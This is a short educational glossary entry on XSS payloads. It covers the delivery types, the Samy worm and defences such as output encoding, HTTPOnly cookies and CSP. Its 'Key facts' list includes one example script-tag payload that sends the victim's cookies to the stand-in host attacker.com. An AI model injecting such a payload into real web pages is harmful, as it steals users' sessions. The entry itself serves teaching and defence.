# XSS payload

## What it is
Like a poisoned fortune cookie slipped into a restaurant's basket — it looks like normal content, but when the victim opens it, malicious code executes in their browser. An XSS payload is the crafted script injected into a vulnerable web application that runs in another user's browser, typically to steal session tokens, redirect users, or log keystrokes.

## Why it matters
In 2005, the Samy worm used a stored XSS payload on MySpace to add "Samy is my hero" to over one million profiles in under 24 hours — the fastest-spreading virus in history at the time. This demonstrated that a single stored payload can propagate automatically at scale, requiring no additional attacker interaction after initial injection. Defenders respond by implementing Content Security Policy (CSP) headers and output encoding to neutralize injected scripts.

## Key facts
- **Three delivery types**: Stored (persisted in database), Reflected (echoed in HTTP response), and DOM-based (manipulates the page's DOM without server involvement)
- **Classic payload**: `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>` hijacks session cookies
- **HTTPOnly cookie flag** prevents JavaScript from reading cookies, directly blocking most XSS-based session theft
- **Output encoding** (e.g., converting `<` to `&lt;`) is the primary mitigation — it neutralizes payload characters before rendering
- **CSP (Content Security Policy)** is a defense-in-depth control that restricts which scripts are allowed to execute, limiting payload impact even if injection occurs

## Related concepts
[[Cross-Site Scripting (XSS)]] [[Content Security Policy]] [[Session Hijacking]] [[Input Validation]] [[DOM-based attacks]]